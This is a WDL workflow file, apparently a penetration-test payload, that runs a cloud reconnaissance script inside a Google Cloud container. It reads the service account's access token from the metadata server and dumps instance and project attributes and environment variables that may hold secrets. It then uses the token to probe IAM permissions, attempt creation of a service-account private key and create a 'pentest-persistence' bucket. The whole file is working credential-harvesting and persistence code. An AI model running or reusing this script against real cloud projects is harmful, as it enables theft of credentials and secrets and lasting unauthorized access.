version 1.0

workflow vm_recon {
    call recon_task
}

task recon_task {
    command <<<
        echo "=== VM METADATA RECON ===" > results.txt
        echo "Date: $(date -u)" >> results.txt
        echo "" >> results.txt

        # 1. SA info
        echo "=== 1. Service Account Info ===" >> results.txt
        SA_EMAIL=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" 2>/dev/null || echo "FAILED")
        echo "SA Email: $SA_EMAIL" >> results.txt

        SA_SCOPES=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" 2>/dev/null || echo "FAILED")
        echo "Scopes: $SA_SCOPES" >> results.txt

        TOKEN=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null || echo "FAILED")
        ACCESS_TOKEN=$(echo "$TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")
        echo "Access token length: ${#ACCESS_TOKEN}" >> results.txt

        # 2. Instance info
        echo "" >> results.txt
        echo "=== 2. Instance Info ===" >> results.txt
        PROJECT=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null || echo "FAILED")
        echo "Project: $PROJECT" >> results.txt

        PROJECT_NUM=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id" 2>/dev/null || echo "FAILED")
        echo "Project Number: $PROJECT_NUM" >> results.txt

        ZONE=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/zone" 2>/dev/null || echo "FAILED")
        echo "Zone: $ZONE" >> results.txt

        HOSTNAME=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname" 2>/dev/null || echo "FAILED")
        echo "Hostname: $HOSTNAME" >> results.txt

        INSTANCE_NAME=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/name" 2>/dev/null || echo "FAILED")
        echo "Instance: $INSTANCE_NAME" >> results.txt

        MACHINE_TYPE=$(curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/machine-type" 2>/dev/null || echo "FAILED")
        echo "Machine type: $MACHINE_TYPE" >> results.txt

        # 3. All SAs on instance
        echo "" >> results.txt
        echo "=== 3. All Service Accounts ===" >> results.txt
        curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" 2>/dev/null >> results.txt || echo "FAILED" >> results.txt

        # 4. Instance attributes (may contain secrets)
        echo "" >> results.txt
        echo "=== 4. Instance Attributes ===" >> results.txt
        curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true" 2>/dev/null >> results.txt || echo "FAILED" >> results.txt

        # 5. Project attributes
        echo "" >> results.txt
        echo "=== 5. Project Attributes ===" >> results.txt
        curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true" 2>/dev/null >> results.txt || echo "FAILED" >> results.txt

        # 6. IAM permissions test
        if [ -n "$ACCESS_TOKEN" ]; then
            echo "" >> results.txt
            echo "=== 6. IAM Permissions Test ===" >> results.txt
            curl -sf -X POST \
                "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT}:testIamPermissions" \
                -H "Authorization: Bearer $ACCESS_TOKEN" \
                -H "Content-Type: application/json" \
                -d '{"permissions":["iam.serviceAccountKeys.create","iam.serviceAccountKeys.list","iam.serviceAccounts.list","iam.serviceAccounts.create","iam.serviceAccounts.getAccessToken","storage.buckets.create","storage.buckets.list","storage.buckets.delete","storage.objects.create","storage.objects.get","storage.objects.list","storage.objects.delete","compute.instances.create","compute.instances.list","resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","cloudfunctions.functions.create","run.services.create","secretmanager.secrets.list","secretmanager.versions.access","batch.jobs.create"]}' 2>/dev/null >> results.txt || echo "FAILED" >> results.txt

            # 7. List SAs in project
            echo "" >> results.txt
            echo "=== 7. Service Accounts in Project ===" >> results.txt
            curl -sf \
                "https://iam.googleapis.com/v1/projects/$PROJECT/serviceAccounts" \
                -H "Authorization: Bearer $ACCESS_TOKEN" 2>/dev/null >> results.txt || echo "FAILED" >> results.txt

            # 8. Try SA key creation
            echo "" >> results.txt
            echo "=== 8. SA Key Creation Attempt ===" >> results.txt
            curl -s -X POST \
                "https://iam.googleapis.com/v1/projects/$PROJECT/serviceAccounts/$SA_EMAIL/keys" \
                -H "Authorization: Bearer $ACCESS_TOKEN" \
                -H "Content-Type: application/json" \
                -d '{"keyAlgorithm":"KEY_ALG_RSA_2048","privateKeyType":"TYPE_GOOGLE_CREDENTIALS_FILE"}' 2>/dev/null >> results.txt || echo "FAILED" >> results.txt

            # 9. Try create bucket outside workspace
            echo "" >> results.txt
            echo "=== 9. Create Bucket Test ===" >> results.txt
            gcloud storage buckets create gs://pentest-persistence-${RANDOM} --location=us-central1 2>&1 >> results.txt || true
        fi

        # 10. Network interfaces
        echo "" >> results.txt
        echo "=== 10. Network Info ===" >> results.txt
        curl -sf -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/?recursive=true" 2>/dev/null >> results.txt || echo "FAILED" >> results.txt

        # 11. Env vars
        echo "" >> results.txt
        echo "=== 11. Environment Variables ===" >> results.txt
        env | sort >> results.txt

        echo "" >> results.txt
        echo "=== DONE ===" >> results.txt

        cat results.txt
    >>>

    output {
        File result = "results.txt"
    }

    runtime {
        docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine"
    }
}
